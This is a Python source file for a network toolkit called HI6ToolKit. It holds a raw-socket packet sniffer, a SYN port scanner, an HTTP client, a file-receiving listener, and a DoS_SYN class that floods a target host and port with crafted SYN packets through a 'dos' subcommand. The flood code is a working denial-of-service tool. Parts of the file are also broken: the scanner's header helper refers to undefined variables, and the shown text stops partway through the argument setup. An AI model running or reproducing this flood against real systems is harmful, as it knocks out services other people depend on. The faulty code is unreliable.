#!/usr/bin/python3
import socket
import asyncio
import struct
import signal
import ssl
import sys
import os
import random
import time
import argparse


class Constant :
    MODULE : bool = __name__ != "__main__"
    ISROOT : bool = os.geteuid() == 0
    TIME : int = round(time.time())
    ISOS : bool = any([os in sys.platform for os in ("linux", "bsd", "darwin")])
    SUP_COLOR : bool = True if os.getenv("COLORTERM") in ("truecolor", "24bit", "color24") and os.getenv("NOCOLOR") in (None, 0, "false", "no") else False
    SLASH : str = chr(47)
    ESCAPE : str = chr(27)
    TOOLS : dict = dict()
    INFO : str = f"""\n
        [System] : [{sys.platform.upper()}, {time.ctime()}]
        [Hostname] : [{socket.gethostname()}, PID {os.getpid()}]
        [Python] : [{sys.implementation.name.title()} {sys.version_info[0]}.{sys.version_info[1]}]
        [GitHub] : [github.com/HI6Cypher]\n\n"""

    def EXIT(code : int) -> None :
        sys.exit(code)
        return

    def SIGNAL(signum : int, stk_frm : "frame") -> None :
        func_name = stk_frm.f_code.co_name
        func_line = str(stk_frm.f_code.co_firstlineno)
        stack_size = str(stk_frm.f_code.co_stacksize)
        EXCEPTION : None = lambda error : print("\n\n[" + Constant.RED("!") + "]" + f" Error : {error or None}", file = sys.stderr)
        msg = Constant.RED(" **SIGNAL** ")
        msg += "\n\n" + f"sig_num : {Constant.YELLOW(signal.Signals(signum).name)}"
        msg += "\n" + f"process_stat : func {Constant.YELLOW(func_name)} in line {Constant.YELLOW(func_line)} with stacksize {Constant.YELLOW(stack_size)}\n"
        EXCEPTION(msg)
        Constant.EXIT(1)
        return

    def RED(text : str) -> str :
        red = Constant.ESCAPE + "[31m"
        end = Constant.ESCAPE + "[0m"
        return red + text + end if Constant.SUP_COLOR else text

    def GREEN(text : str) -> str :
        green = Constant.ESCAPE + "[32m"
        end = Constant.ESCAPE + "[0m"
        return green + text + end if Constant.SUP_COLOR else text

    def YELLOW(text : str) -> str :
        yellow = Constant.ESCAPE + "[33m"
        end = Constant.ESCAPE + "[0m"
        return yellow + text + end if Constant.SUP_COLOR else text

    def STANDARDIZE_MAC(mac : bytes) -> str :
        return ":".join([f"{sec:02x}" for sec in mac])


class Sniff :
    def __init__(self, iface : str, parse : bool, tmp : bool, saddr : str, daddr : str) -> "Sniff_class" :
        self.iface = iface
        self.parse = parse
        self.tmp = tmp
        self.saddr = saddr
        self.daddr = daddr
        self.generator = None
        self.check_interface()
        self.check_eth_p_all()

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Sniff : \n\t{self.iface}"

    def __iter__(self) -> "Sniff_iteration" :
        self.generator = self.sniff()
        return self

    def __next__(self) -> tuple[str | None, memoryview | None] :
        try :
            return next(self.generator)
        except StopIteration :
            self.generator = None
            raise StopIteration

    def parse_eth_header(self, data : memoryview | bytes) -> tuple[str, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        dst, src, typ = self.eth_header(data)
        parsed_header += f"Ethernet Frame :{t}Source MAC : {src}{t}Destination MAC : {dst}{t}Ethernet Type : {typ}"
        return parsed_header, typ

    def parse_arp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        hdr, prt, hln, pln, opc, sha, spa, tha, tpa = self.arp_header(data)
        parsed_header += f"Arp Datagram :{t}Hardware Type : {hdr}{t}Protocol Type : {prt}{t}Hardware Length : {hln}"
        parsed_header += f"{t}Protocol Length : {pln}{t}Opcode : {opc}{t}Sender Hardware Address : {sha}"
        parsed_header += f"{t}Sender Protocol Address : {spa}{t}Target Hardware Address : {tha}"
        parsed_header += f"{t}Target Protocol Address : {tpa}"
        return parsed_header

    def parse_ip_header(self, data : memoryview | bytes) -> tuple[str, int, str | int] :
        parsed_header = str()
        t = "\n\t\t"
        ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst = self.ip_header(data)
        parsed_header += f"IPv4 Datagram :{t}Version : {ver}  Header Length : {ihl}  Time of Service : {tos}"
        parsed_header += f"{t}Total Length : {tln}  Identification : {idn}  Flags : {flg}"
        parsed_header += f"{t}Fragment Offset : {oft}  TTL : {ttl}  Protocol : {prt}"
        parsed_header += f"{t}Checksum : {csm}  Source : {src}  Destination : {dst}"
        return parsed_header, ihl, prt

    def parse_tcp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(data)
        parsed_header += f"TCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}\t"
        parsed_header += f"URG:{flg['urg']}  ACK:{flg['ack']}  PSH:{flg['psh']}{t}\tRST:{flg['rst']}  SYN:{flg['syn']}  FIN:{flg['fin']}{t}"
        parsed_header += f"Window : {win}{t}Checksum : {csm}{t}Urgent Pointer : {urg}{t}Raw Data :\n{self.indent_data(data)}"
        return parsed_header

    def parse_udp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        src, dst, tln, csm, data = self.udp_header(data)
        parsed_header += f"UDP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Length : {tln}{t}Checksum : {csm}{t}Raw Data :\n{self.indent_data(data)}"
        return parsed_header

    def parse_icmp_header(self, data : memoryview | bytes) -> str :
        parsed_header = str()
        t = "\n\t\t"
        typ, cod, csm, idn, seq, data = self.icmp_header(data)
        parsed_header += f"ICMP Datagram :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.indent_data(data)}"
        return parsed_header

    def parse_headers(self, raw_data : memoryview | bytes) -> str :
        parsed_headers = str()
        spec_header = f"[+][DATALINK]________________{Constant.TIME}________________"
        eth_data = raw_data[:14]
        parsed_eth_header, typ = self.parse_eth_header(eth_data)
        match typ :
            case "IPv4" :
                ip_data = raw_data[14:]
                parsed_ip_header, ihl, prt = self.parse_ip_header(ip_data)
                match prt :
                    case "TCP" :
                        tcp_data = raw_data[14 + ihl:]
                        transport_layer_header = self.parse_tcp_header(tcp_data)
                    case "UDP" :
                        udp_data = raw_data[14 + ihl:]
                        transport_layer_header = self.parse_udp_header(udp_data)
                    case "ICMP" :
                        icmp_data = raw_data[14 + ihl:]
                        transport_layer_header = self.parse_icmp_header(icmp_data)
                    case _ :
                        transport_layer_header = f"{prt} : unimplemented transport layer protocol"
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_ip_header
                parsed_headers += "\n\n"
                parsed_headers += transport_layer_header
                parsed_headers += "\n\n"
                return parsed_headers
            case "ARP" :
                arp_data = raw_data[14:]
                parsed_arp_header = self.parse_arp_header(arp_data)
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_arp_header
                parsed_headers += "\n\n"
                return parsed_headers
            case _ :
                parsed_headers += spec_header
                parsed_headers += "\n\n"
                parsed_headers += parsed_eth_header
                parsed_headers += "\n\n"
                parsed_headers += f"{typ} : unimplemented network layer protocol"
                parsed_headers += "\n\n"
                return parsed_headers

    def check_interface(self) -> None :
        ifaces = [iface[-1] for iface in socket.if_nameindex()]
        if self.iface not in ifaces :
            raise OSError(f"{self.iface} not in {ifaces}")
        self.iface = self.iface.encode()
        return

    def check_ip(self, frame : memoryview | bytes) -> bool :
        typ = bytes(frame[12:14]).hex()
        return typ == "0800"

    def check_saddr_ip(self, frame : memoryview | bytes) -> bool :
        src = ".".join((str(i) for i in tuple(frame[14:][12:16])))
        return src == self.saddr

    def check_daddr_ip(self, frame : memoryview | bytes) -> bool :
        dst = ".".join((str(i) for i in tuple(frame[14:][16:20])))
        return dst == self.daddr

    def check_eth_p_all(self) -> None :
        if "ETH_P_ALL" not in socket.__all__ :
            socket.ETH_P_ALL = 3
        return

    def filter(func : "func") -> tuple[str | None, memoryview | None] :
        def filter(self) -> tuple[str | None, memoryview] :
            frame = func(self)
            nonce = 0
            if not (self.saddr or self.daddr) :
                return (self.parse_headers(frame).expandtabs(4) if self.parse else str(), frame)
            if not self.check_ip(frame) :
                return (None, None)
            if self.saddr :
                nonce += 1 if self.check_saddr_ip(frame) else -1
            if self.daddr :
                nonce += 1 if self.check_daddr_ip(frame) else -1
            if nonce > 0 :
                return (self.parse_headers(frame).expandtabs(4) if self.parse else str(), frame)
            else : return (str(), bytes())
        return filter

    def sniff(self) -> tuple[str | None, memoryview] :
        while True :
            yield self.__sniff()

    @staticmethod
    def eth_header(raw_payload : bytes) -> tuple[str, str, str | int] :
        payload = struct.unpack("!6s6sH", raw_payload)
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        dst = standardize_mac_addr(payload[0])
        src = standardize_mac_addr(payload[1])
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6",
            0x0806 : "ARP"
            }
        typ = protos.get(payload[2], payload[2])
        return dst, src, typ

    @staticmethod
    def ip_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, int, int, int, str | int, int, str, str] :
        payload = struct.unpack("!BBHHHBBH4s4s", raw_payload[:20])
        ver = payload[0] >> 4
        ihl = (payload[0] & 0xf) * 4
        tos = payload[1]
        tln = payload[2]
        idn = payload[3]
        flg = payload[4] >> 13
        oft = payload[4] & 0x1fff
        ttl = payload[5]
        protos = {
            0x0001 : "ICMP",
            0x0006 : "TCP",
            0x0011 : "UDP"
            }
        prt = protos.get(payload[6], payload[6])
        csm = hex(payload[7])
        src = socket.inet_ntop(socket.AF_INET, payload[8])
        dst = socket.inet_ntop(socket.AF_INET, payload[9])
        return ver, ihl, tos, tln, idn, flg, oft, ttl, prt, csm, src, dst

    @staticmethod
    def arp_header(raw_payload : memoryview | bytes) -> tuple[str | int, str | int, int, int, str | int, str, str, str, str] :
        payload = struct.unpack("!HHBBH6s4s6s4s", raw_payload[:28])
        standardize_mac_addr : str = lambda x : ":".join([f"{sec:02x}" for sec in x])
        hdr = "Ethernet(1)" if payload[0] == 1 else payload[0]
        protos = {
            0x0800 : "IPv4",
            0x86dd : "IPv6"
            }
        prt = protos.get(payload[1], payload[1])
        hln = payload[2]
        pln = payload[3]
        opcodes = {
            0x0001 : "ARP REQ",
            0x0002 : "ARP REP"
            }
        opc = opcodes.get(payload[4], payload[4])
        sha = standardize_mac_addr(payload[5])
        spa = socket.inet_ntop(socket.AF_INET, payload[6])
        tha = standardize_mac_addr(payload[7])
        tpa = socket.inet_ntop(socket.AF_INET, payload[8])
        return hdr, prt, hln, pln, opc, sha, spa, tha, tpa

    @staticmethod
    def tcp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, dict, int, int, int, memoryview | bytes] :
        payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
        src = payload[0]
        dst = payload[1]
        seq = payload[2]
        acn = payload[3]
        oft = (payload[4] >> 4) * 4
        flg = payload[5]
        urg = (flg & 32) >> 5
        ack = (flg & 16) >> 4
        psh = (flg & 8) >> 3
        rst = (flg & 4) >> 2
        syn = (flg & 2) >> 1
        fin = flg & 1
        flg = {
            "urg" : urg,
            "ack" : ack,
            "psh" : psh,
            "rst" : rst,
            "syn" : syn,
            "fin" :fin
                }
        win = payload[6]
        csm = hex(payload[7])
        urg = payload[8]
        data = raw_payload[oft:]
        return src, dst, seq, acn, oft, flg, win, csm, urg, data

    @staticmethod
    def udp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, memoryview | bytes] :
        payload = struct.unpack("!HHHH", raw_payload[:8])
        src = payload[0]
        dst = payload[1]
        tln = payload[2]
        csm = hex(payload[3])
        data = raw_payload[8:]
        return src, dst, tln, csm, data

    @staticmethod
    def icmp_header(raw_payload : memoryview | bytes) -> tuple[int, int, int, int, int, memoryview | bytes] :
        payload = struct.unpack("!BBHHH", raw_payload[:8])
        typ = payload[0]
        cod = payload[1]
        csm = hex(payload[2])
        idn = payload[3]
        seq = payload[4]
        data = raw_payload[8:]
        return typ, cod, csm, idn, seq, data

    @staticmethod
    def indent_data(data : memoryview | bytes) -> str : #TODO : think this algorithm is too slow because of insert()
        data = data.tolist()
        for i in range(len(data)) :
            if data[i] not in range(32, 127) : data[i] = 46
        data.insert(0, 9)
        data.insert(0, 9)
        for i in range((len(data) // 64) + 1) :
            index = (i + 1) * 64
            data.insert(index, 9)
            data.insert(index, 9)
            data.insert(index, 10)
        else :
            data.insert(0, 10)
            data.insert(0, 9)
            data.insert(0, 9)
        return bytes(data).decode()

    @staticmethod
    def tmp_file(data : str) -> None :
        path = f"data_{Constant.TIME}.txt"
        mode = "a" if os.path.exists(path) else "x"
        print(data, file = open(path, mode))
        return

    @filter
    def __sniff(self) -> tuple[str | None, memoryview] :
        with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(socket.ETH_P_ALL)) as sniff :
            sniff.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, self.iface)
            while True :
                raw_data = sniff.recvfrom(65535)[0]
                raw_data_memview = memoryview(raw_data)
                if raw_data : return raw_data_memview

class Scan :
    def __init__(self, source : str, host : str, timeout : int, event_loop : "async_event_loop") -> "Scan_class" :
        self.source = source
        self.host = host
        self.timeout = timeout
        self.loop = event_loop
        self.ipv4_static_header = self.ipv4_header()
        self.opens = list()
        self.unspecified = list()

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Scan : \n\t{self.host}\n\t{self.port}\n\t{self.timeout}"

    def ipv4_header(self) -> bytes :
        src = socket.inet_pton(socket.AF_INET, self.source)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        randidn = random.randint(1024, 65535)
        header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum_ip_header = self.checksum(header)
        header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum_ip_header)
        return header

    def tcpip_header(self, port : int) -> tuple[bytes, int] :
        src = socket.inet_pton(socket.AF_INET, self.source)
        dst = socket.inet_pton(socket.AF_INET, self.host)
        src_p = random.randint(1024, 65535)
        dst_p = port
        randseq = random.randint(0, 65535)
        header = self.tcp_header(src = src_p, dst = dst_p, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(header))
        checksum_tcp_header = self.checksum(header + pseudo_header)
        header = self.tcp_header(src = src_p, dst = dst_p, seq = randseq, syn = 1, csm = checksum_tcp_header)
        return header, randseq

    async def package(self, port : int) -> tuple[bytes, int] :
        ip_header = self.ipv4_static_header
        tcp_header = self.tcpip_header(port)
        payload = ip_header + tcp_header[0]
        return payload, tcp_header[1]

    async def send(self, port : int) -> tuple[bool, bytes | None] :
        try :
            payload = await self.package(port)
            async with asyncio.timeout(self.timeout) :
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as scan :
                    scan.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    scan.settimeout(self.timeout)
                    scan.setblocking(False)
                    await self.loop.sock_sendto(scan, payload[0], (self.host, port))
                    while True :
                        rsp = await self.loop.sock_recv(scan, 1024)
                        if self.check_acknum(payload[1], rsp[20:]) :
                            return True, rsp
        except asyncio.TimeoutError :
            return False, None
        except socket.timeout :
            return False, None

    async def scan(self, port : int) -> tuple[bool, bool] :
        return await self.__scan(port)

    @staticmethod
    def is_open_port(tcp_header : bytes) -> bool :
         flags = tcp_header[13:14]
         ack_syn = bytes(flags).hex() == "12"
         return True if ack_syn else False

    @staticmethod
    def check_acknum(acn : int, tcp_header : bytes) -> bool :
        acknum_byte = tcp_header[8:12]
        return True if int(bytes(acknum_byte).hex(), base = 16) - 1 == acn else False

    @staticmethod
    def ip_header(src : str, dst : str, idn : int = 0, csm : int = 0) -> bytes :
        return DoS_SYN.ip_header(src = src, dst = dst, idn = idn, csm = csm)

    @staticmethod
    def tcp_header(src : int = 0, dst : int = 0, seq : int = 0, syn = 0, csm : int = 0) -> bytes :
        return DoS_SYN.tcp_header(srp = srp, dsp = dsp, seq = seq, syn = 1, csm = csm)

    @staticmethod
    def pseudo_header(src : str, dst : str, pln : int = 0) -> bytes :
        return DoS_SYN.pseudo_header(src = src, dst = dst, pln = pln)

    @staticmethod
    def checksum(data : bytes) -> int :
        return DoS_SYN.checksum(data)

    async def __scan(self, port : int) -> tuple[bool, bool] :
        status, response = await self.send(port)
        if status :
            tcp_header = response[20:]
            is_open = self.is_open_port(tcp_header)
            if is_open :
                self.opens.append(port)
                return True, True
            else :
                return False, True
        else :
            self.unspecified.append(port)
            return False, False


class DoS_SYN :
    def __init__(self, host: str, port : int, rate : int) -> "DoS_SYN_class" :
        self.host = host
        self.port = int(port)
        self.rate = rate

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"DoS_SYN : \n\t{self.host}\n\t{self.port}"

    def package(self) -> bytes :
        randip = self.random_ip()
        randnum = lambda x, y : random.randint(x, y)
        src = socket.inet_pton(socket.AF_INET, "192.168.129.207")
        dst = socket.inet_pton(socket.AF_INET, self.host)
        randidn = randnum(0, 65535)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
        checksum = self.checksum(ip_header)
        ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
        randseq = randnum(0, 65535)
        randsrp = randnum(1024, 65535)
        tcp_header = self.tcp_header(srp = randsrp, dsp = self.port, seq = randseq, syn = 1)
        pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
        data = tcp_header + pseudo_header
        tcp_checksum = self.checksum(data)
        tcp_header = self.tcp_header(srp = randsrp, dsp = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
        payload = ip_header + tcp_header
        return payload

    def flood(self) -> None :
        self.__flood()
        return

    @staticmethod
    def ip_header(src : str, dst : str,
        ver : int = 4, ihl : int = 5,
        tos : int = 0, tln : int = 40,
        idn : int = 0, flg : int = 0,
        oft : int = 0, ttl : int = 255,
        prt : int = socket.IPPROTO_TCP, csm : int = 0) -> bytes :
        ihl_ver = (ver << 4) + ihl
        flg_oft = (flg << 13) + oft
        datagram = struct.pack("!BBHHHBBH4s4s", ihl_ver, tos, tln, idn, flg_oft, ttl, prt, csm, src, dst)
        return datagram

    @staticmethod
    def tcp_header(srp : int = 0, dsp : int = 0,
        seq : int = 0, acn : int = 0,
        oft : int = 5, urg : int = 0,
        ack : int = 0, psh : int = 0,
        rst : int = 0, syn : int = 0,
        fin : int = 0, win : int = 65535,
        csm : int = 0, urp : int = 0) -> bytes :
        oft <<= 12
        res = 0 << 6
        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
        oft_res_flg = oft + res + flg
        segment = struct.pack("!HHLLHHHH", srp, dsp, seq, acn, oft_res_flg, win, csm, urp)
        return segment

    @staticmethod
    def pseudo_header(src : str, dst : str,
        res : int = 0, prt : int = socket.IPPROTO_TCP,
        pln : int = 0) -> bytes :
        segment = struct.pack("!4s4sBBH", src, dst, res, prt, pln)
        return segment

    @staticmethod
    def checksum(data : bytes) -> int :
        checksum = 0
        for i in range(0, len(data), 2) :
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        checksum = (checksum >> 16) + (checksum & 65535)
        checksum = (~ checksum) & 65535
        return checksum

    @staticmethod
    def random_ip() -> str :
        secs = [str(random.randint(0, 255)) for _ in range(0, 4)]
        return ".".join(secs)

    @staticmethod
    def progress_bar(x : int, y : int) -> str :
        symbol = Constant.SLASH
        if y < 32 : return 32 * symbol if x == y else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    def __flood(self) -> None :
        count = 0
        while count != self.rate :
            payload = self.package()
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                flood.connect((self.host, self.port))
                flood.sendto(payload, (self.host, self.port))
                flood.shutdown(socket.SHUT_RDWR)
            count += 1
            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(count, self.rate)}" + " " + f"[{count}/{self.rate}]"
            print(text, end = "\r", flush = True)
        else :
            end_time = round((time.time() - Constant.TIME), 2)
            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have sent")
            print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
        return


class HTTP_Request :
    def __init__(self, host : str, port : int, method : str, header : str, end : str, https : bool) -> "HTTP_Request_class" :
        self.host = host
        self.port = int(port)
        self.method = method if method in ("GET", "HEAD") else "GET"
        self.header = header
        self.end = end if end else "/"
        self.https = bool(https)
        self.request_header = str()
        self.response = bytes()
        self.response_header = str()

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"HTTP_Request : \n\t{self.host}\n\t{self.port}"

    def request(self) -> None :
        self.__request()
        return

    def __request(self) -> None :
        if self.https : sslcontext = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http :
            http.settimeout(30)
            http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
            payload = [
                f"{self.method} {self.end} HTTP/1.1",
                f"Host: {self.host}",
                "User-Agent: HI6ToolKit",
                "Accept: */*",
                "Connection: close",
                "\r\n"
                ] if not self.header else self.header
            payload = "\r\n".join(payload) if not self.header else payload
            self.request_header = payload
            if not Constant.MODULE : print(payload)
            http.connect((self.host, self.port))
            http.send(payload.encode())
            raw_data = bytes()
            while True :
                response = http.recv(1024)
                if not response :
                    raw_data = raw_data.split(b"\r\n\r\n", 1)
                    self.response_header = raw_data[0].decode()
                    self.response = raw_data[-1]
                    if not Constant.MODULE :
                        print(self.response_header, end = "\n\n")
                        if self.method == "GET" : print(self.response)
                    if self.https : http.close()
                    break
                else :
                    raw_data += response
        return


class Tunnel :
    def __init__(self, host : str, port : int, timeout : int, buffer : int) -> "Tunnel_class" :
        self.host = host
        self.port = port
        self.timeout = timeout
        self.buffer = buffer
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Tunnel : \n\t{self.host}\n\t{self.port}"

    def tunnel(self) -> None :
        self.__tunnel()
        return

    def init_server(self) -> None :
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(self.timeout)
        self.sock.bind((self.host, self.port))
        self.sock.listen(1)
        return

    def get_header(self, sock : socket.socket) -> str :
        header = bytes()
        while not header.endswith(b"\r\n\r\n") :
            header += self.readline(sock)
        else : return header.decode()

    @staticmethod
    def open_file(name : str) -> "file" :
        path = f"./{name}"
        mode = "ab" if os.path.exists(path) else "wb"
        return open(path, mode)

    @staticmethod
    def tmp_file(file : "open", data : bytes) -> None :
        file.write(data)
        return

    @staticmethod
    def parse_headers(data : bytes) -> dict :
        headers = {header.split(": ", 1)[0] : header.split(": ", 1)[-1] for header in data.split("\r\n")[1:-1]}
        headers["status"] = data.split("\r\n", 1)[0].split(" ")[0]
        headers["name"] = data.split("\r\n", 1)[0].split(" ")[1][1:]
        headers["version"] = data.split("\r\n", 1)[0].split(" ")[-1]
        return headers

    @staticmethod
    def get_name(headers : dict) -> str :
        keyword = "name"
        if keyword in headers and headers[keyword] :
            return headers[keyword] + f"_{Constant.TIME}"  + ".tmp"
        else : return f"new_{Constant.TIME}.tmp"

    @staticmethod
    def get_length(headers : dict) -> int :
        keyword = "Content-Length"
        if keyword in headers :
            return int(headers[keyword])
        else : return 0

    @staticmethod
    def get_status(headers : dict) -> str | None :
        keyword = "status"
        if keyword in headers :
            return headers[keyword]
        else :
            raise Exception("couldn't find status")
            return

    @staticmethod
    def get_version(headers : dict) -> str :
        keyword = "version"
        if keyword in headers :
            return headers[keyword]
        else : return "HTTP/1.0"

    @staticmethod
    def get_parts(length : int, buffer : int) -> tuple[int, int] :
        if buffer > length : return length, 0
        npart = length // buffer
        nrimd = length % buffer
        return nrimd, npart

    @staticmethod
    def readline(sock : socket.socket) -> bytes :
        line = bytes()
        while not line.endswith(b"\r\n") :
            line += sock.recv(1)
        else : return line

    @staticmethod
    def readbuffer(sock : socket.socket, buffer : int) -> bytes :
        data = bytes()
        while len(data) != buffer :
            data += sock.recv(buffer - len(data))
        else : return data

    @staticmethod
    def write(sock : socket.socket, data : bytes) -> None :
        data = data if isinstance(data, bytes) else data.encode()
        sock.sendall(data)
        return

    @staticmethod
    def prepare_response(version : str, success : bool) -> str :
        if success :
            payload = [
            f"{version} 200 OK",
            "User-Agent: HI6ToolKit",
            "\r\n"
            ]
        else :
            payload = [
                f"{version} 400 Bad Request",
                "User-Agent: HI6ToolKit",
                "\r\n"
                ]
        payload = "\r\n".join(payload).encode()
        return payload

    @staticmethod
    def progress_bar(x : int, y : int) -> str :
        symbol = Constant.SLASH
        if y < 32 : return 32 * symbol if x == y else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    @staticmethod
    def percent(x : int, y : int) -> int :
        return round((x / y) * 100)

    def __tunnel(self) -> None :
        print("[" + Constant.GREEN("+") + "]" + " " + "run init_server()", end = "  ", flush = True)
        self.init_server()
        print(Constant.GREEN("DONE"))
        print("[" + Constant.GREEN("+") + "]" + " " + "run socket.accept()")
        conn, addr = self.sock.accept()
        print("[" + Constant.GREEN("+") + "]" + " " + f"new connection from {addr[0]}:{addr[-1]}")
        headers = self.parse_headers(self.get_header(conn))
        print("[" + Constant.GREEN("+") + "]" + " " + "parsing header", end = "  ", flush = True)
        status, name, version, length = self.get_status(headers), self.get_name(headers), self.get_version(headers), self.get_length(headers)
        print(Constant.GREEN("DONE"))
        if not length :
            print("[" + Constant.GREEN("+") + "]" + " " + f"couldn't find Content-Length, send Bad Request to {addr[0]}:{addr[1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, False)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
            Constant.EXIT(1)
        send_length = 0
        tail, parts = self.get_parts(length, self.buffer)
        file = self.open_file(name)
        OUTPUT : str = lambda x, y : "[" + Constant.GREEN("*") + "]" + " " + self.progress_bar(x, y) + " " + f"[{self.percent(x, y)}%]" + f"[{x}/{y}]"
        while parts != 0 :
            data = self.readbuffer(conn, self.buffer)
            self.tmp_file(file, data)
            send_length += self.buffer
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            parts -= 1
        else :
            data = self.readbuffer(conn, tail)
            self.tmp_file(file, data)
            send_length += tail
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            print("\n[" + Constant.GREEN("+") + "]" + " " + f"sending OK to {addr[0]}:{addr[-1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, True)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
        return


if not Constant.MODULE :
    def manage_args() -> argparse.Namespace :
        global Sniff_args, DoS_SYN_args, HTTP_Request_args, Tunnel_args
        parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
        subparser = parser.add_subparsers(title = "tools")
        info_tool = subparser.add_parser("info", help = "print informations about os, system etc.")
        info_tool.set_defaults(func = info_args)
        sniff_tool = subparser.add_parser("sniff", help = "execute Sniff class")
        sniff_tool.add_argument("-if", "--iface", type = str, help = "sniffs on specific interface")
        sniff_tool.add_argument("-s", "--saddr", type = str, help = "process IPv4 header with specified saddr", default = None)
        sniff_tool.add_argument("-d", "--daddr", type = str, help = "process IPv4 header with specified daddr", default = None)
        sniff_tool.add_argument("-t", "--tmp", action = "store_true", help = "tmps sniffed packets in file", default = False)
        sniff_tool.set_defaults(func = Sniff_args)
        scan_tool = subparser.add_parser("scan", help = "execute SYN port scanner")
        scan_tool.add_argument("-s", "--source", type = str, help = "sets source addr for scanning")
        scan_tool.add_argument("-x", "--host", type = str, help = "sets host addr for scanning")
        scan_tool.add_argument("-p", "--port_range", type = str, help = "sets range of ports for scanning", default = "0-65535")
        scan_tool.add_argument("-t", "--timeout", type = int, help = "sets timeout for unanswered syn segments", default = 5)
        scan_tool.set_defaults(func = Scan_args)
        dos_tool = subparser.add_parser("dos", help = "execute DoS_SYN class")
        dos_tool.add_argument("-x", "--host", type = str, help = "sets host for flooding")
        dos_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding")
        dos_tool.add_argument("-r", "--rate", type = int, help = "sets rate(number of packets)")
        dos_tool.set_defaults(func = DoS_SYN_args)
        http_tool = subparser.add_parser("http", help = "execute HTTP_Request class")
        http_tool.add_argument("-x", "--host", type = str, help = "sets host for http request")
        http_tool.add_argument("-p", "--port", type = int, help = "sets port for http request", default = 80)
        http_tool.add_argument("-m", "--method", type = str, help = "sets request type(GET or HEAD)", default = "GET")
        http_tool.add_argument("-c", "--custom", type = str, help = "sets custome header for HTTP_Request", default = str())
        http_tool.add_argument("-e", "--endpoint", type = str, help = "sets endpoint", default = "/")
        http_tool.add_argument("-s", "--secure", action = "store_true", help = "sets secure socket(ssl)", default = False)
        http_tool.set_defaults(func = HTTP_Request_args)
        tunnel_tool = subparser.add_parser("tunnel", help = "execute Tunnel class")
        tunnel_tool.add_argument("-x", "--host", type = str, help = "sets host", default = "0.0.0.0")
        tunnel_tool.add_argument("-p", "--port", type = int, help = "sets port", default = "80")
